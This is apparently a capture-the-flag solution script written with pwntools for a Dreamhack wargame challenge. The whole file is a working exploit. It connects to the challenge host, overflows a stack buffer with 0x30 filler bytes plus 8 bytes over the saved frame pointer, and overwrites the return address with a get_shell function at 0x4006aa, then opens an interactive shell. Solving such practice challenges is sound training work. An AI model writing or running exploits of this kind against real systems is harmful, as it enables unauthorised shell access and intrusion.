from pwn import *

Host = 'host3.dreamhack.games'
Port = 18315

p = remote(Host, Port)

get_shell = 0x4006aa

payload = b'A'*0x30
payload += b'B'*0x8
payload += p64(get_shell)

p.sendline(payload)
p.interactive()
